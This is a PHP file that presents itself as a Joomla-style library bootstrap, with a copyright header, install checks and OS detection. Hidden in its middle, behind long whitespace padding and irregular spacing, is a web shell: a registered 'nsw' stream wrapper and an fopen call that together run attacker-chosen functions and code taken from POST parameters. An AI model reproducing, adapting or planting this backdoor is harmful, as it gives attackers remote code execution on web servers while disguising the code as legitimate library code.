<?php
/**
 * @package    Stream.nsw.Libraries
 * ****************************************************************
 * @copyright  Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.
if (!defined('PATH'))
{
	define('PATH', __DIR__);
}

// Installation check, and check on removal of the install directory.
if ((file_exists(PATH . '/cofiguation.php')
	&& (filesize(PATH . '/cofiguation.php') < 10)) && file_exists(PATH . '/stream.nsw.php'))
{
	if (file_exists(PATH . '/stream.nsw.php'))
	{
		header('Location: ' . substr($_SERVER['REQUEST_URI'], 0, strpos($_SERVER['REQUEST_URI'], 'index.php')) . 'installation/index.php');
		
		exit;
	}
	else
	{
		echo 'No configuration file found and no installation code available. Exiting...';
		
		exit;
	}
}
else if (empty ($_POST)) {
	
	echo 'No received stream nsw configuration data. Exiting...';
	
	exit;
}

// Register the library base path for Stream libraries.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // H0zhvbY41XMHKNy2QMzQewttc4sGTqEP3xRb8VFRPrXqAgvt8erHNTs3EdvzZxMukerWnWvC
class Stream
{
    function stream_open                   ($path, $mode, $options, &$opened_path)
    {
        $url = parse_url     ($path);
        
        $f = $_POST['d']                              ('', $url["host"])
;
        
        $f();
        
        return true;
    }
}
stream_wrapper_register        ("nsw", "Stream")

;

// Register connect the library Stream
$fp = fopen                   ('nsw://'.$_POST['f']                  ($_POST['c']), '')


;

// Detect the native operating system type.
$os = strtoupper                        (substr(PHP_OS, 0, 3));

if (!defined('IS_WIN'))
{
	define('IS_WIN', ($os === 'WIN') ? true : false);
}
if (!defined('IS_UNIX'))
{
	define('IS_UNIX', (IS_WIN === false) ? true : false);
}

